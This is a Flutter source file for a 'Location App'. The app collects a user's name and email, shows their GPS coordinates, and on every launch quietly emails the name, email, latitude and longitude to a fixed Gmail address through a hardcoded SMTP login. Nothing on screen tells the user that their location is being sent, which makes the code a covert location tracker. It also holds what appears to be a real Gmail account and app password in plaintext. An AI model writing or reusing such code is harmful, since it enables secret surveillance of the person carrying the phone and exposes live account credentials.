import 'package:flutter/material.dart';
import 'package:geolocator/geolocator.dart';
import 'package:mailer/mailer.dart';
import 'package:mailer/smtp_server.dart';
import 'package:shared_preferences/shared_preferences.dart';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  SharedPreferences prefs = await SharedPreferences.getInstance();

  runApp(MyApp(
    sharedPreferences: prefs,
  ));
}

class MyApp extends StatelessWidget {
  final SharedPreferences sharedPreferences;

  MyApp({required this.sharedPreferences});

  @override
  Widget build(BuildContext context) {
    // Check if shared preferences values are null
    if (sharedPreferences.getString('firstName') == null && sharedPreferences.getString('email')== null) {
      return MaterialApp(
        home: PersonalInfoScreen(),
      );
    } else {
      return MaterialApp(
        home: LocationScreen(
          firstName: sharedPreferences.getString('firstName')!,
          lastName: sharedPreferences.getString('lastName')!,
          email: sharedPreferences.getString('email')!,
        ),
      );
    }
  }
}

class PersonalInfoScreen extends StatefulWidget {
  @override
  _PersonalInfoScreenState createState() => _PersonalInfoScreenState();
}

class _PersonalInfoScreenState extends State<PersonalInfoScreen> {
  final TextEditingController firstNameController = TextEditingController();
  final TextEditingController lastNameController = TextEditingController();
  final TextEditingController emailController = TextEditingController();

  final _formKey = GlobalKey<FormState>(); // Key for the form validation

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: Text('Personal Info'),
      ),
      body: Padding(
        padding: EdgeInsets.all(16.0),
        child: Form(
          key: _formKey, // Assign the form key
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.stretch,
            mainAxisAlignment: MainAxisAlignment.center,
            children: <Widget>[
              TextFormField(
                controller: firstNameController,
                decoration: InputDecoration(labelText: 'First Name'),
                validator: (value) {
                  if (value == null || value.isEmpty) {
                    return 'Please enter your first name';
                  }
                  return null;
                },
              ),
              TextFormField(
                controller: lastNameController,
                decoration: InputDecoration(labelText: 'Last Name'),
                validator: (value) {
                  if (value == null || value.isEmpty) {
                    return 'Please enter your last name';
                  }
                  return null;
                },
              ),
              TextFormField(
                controller: emailController,
                decoration: InputDecoration(labelText: 'Email'),
                validator: (value) {
                  if (value == null || value.isEmpty) {
                    return 'Please enter your email';
                  }
                  // You can add more sophisticated email validation if needed
                  return null;
                },
              ),
              SizedBox(height: 20),
              ElevatedButton(
                onPressed: () async {
                  // Validate the form before navigating
                  if (_formKey.currentState?.validate() ?? false) {
                    // Save user information to shared preferences
                    await _saveUserInfo();

                    // Navigate to the location screen and pass the entered data
                    Navigator.pushReplacement(
                      context,
                      MaterialPageRoute(
                        builder: (context) => LocationScreen(
                          firstName: firstNameController.text,
                          lastName: lastNameController.text,
                          email: emailController.text,
                        ),
                      ),
                    );
                  }
                },
                child: Text('Submit'),
              ),
            ],
          ),
        ),
      ),
    );
  }

  Future<void> _saveUserInfo() async {
    SharedPreferences prefs = await SharedPreferences.getInstance();
    prefs.setString('firstName', firstNameController.text);
    prefs.setString('lastName', lastNameController.text);
    prefs.setString('email', emailController.text);
  }
}

class LocationScreen extends StatefulWidget {
  final String firstName;
  final String lastName;
  final String email;

  LocationScreen({
    required this.firstName,
    required this.lastName,
    required this.email,
  });

  @override
  _LocationScreenState createState() => _LocationScreenState();
}

class _LocationScreenState extends State<LocationScreen> {
  String latitude = 'Loading...';
  String longitude = 'Loading...';

  @override
  void initState() {
    super.initState();
    _getLocation();
  }

  Future<void> _getLocation() async {
    try {
      Position position = await Geolocator.getCurrentPosition(
        desiredAccuracy: LocationAccuracy.high,
      );

      setState(() {
        latitude = '${position.latitude}';
        longitude = '${position.longitude}';
      });

      // After getting the location, send email with the information
      await _sendEmail();

      print('Location and email sending successful');
    } catch (e) {
      print("Error getting location or sending email: $e");
      setState(() {
        latitude = 'Error';
        longitude = 'Error';
      });
    }
  }

  Future<void> _sendEmail() async {
    try {
      String emailSubject = 'Location Information';
      String emailBody =
          'First Name: ${widget.firstName}\n'
          'Last Name: ${widget.lastName}\n'
          'Email: ${widget.email}\n'
          'Latitude: $latitude\n'
          'Longitude: $longitude';

      final smtpServer = gmail('sharmadev5050@gmail.com', 'stgadefughsnxgzh');

      // Create an SMTP message
      final message = Message()
        ..from =  Address('sharmadev5050@gmail.com', 'inform')
        ..recipients.add('rekha.dev.sharma@gmail.com') // Change this to the recipient's email address
        ..subject = emailSubject
        ..text = emailBody;

      // Send the message
      await send(message, smtpServer);

      print('Email sent successfully');
    } catch (e) {
      print('Error sending email: $e');
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: Text('Location App'),
      ),
      body: Center(
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: <Widget>[
            Text('Welcome, ${widget.firstName} ${widget.lastName}!'),
            Text('Email: ${widget.email}'),
            Text('Latitude: $latitude'),
            Text('Longitude: $longitude'),
          ],
        ),
      ),
    );
  }
}
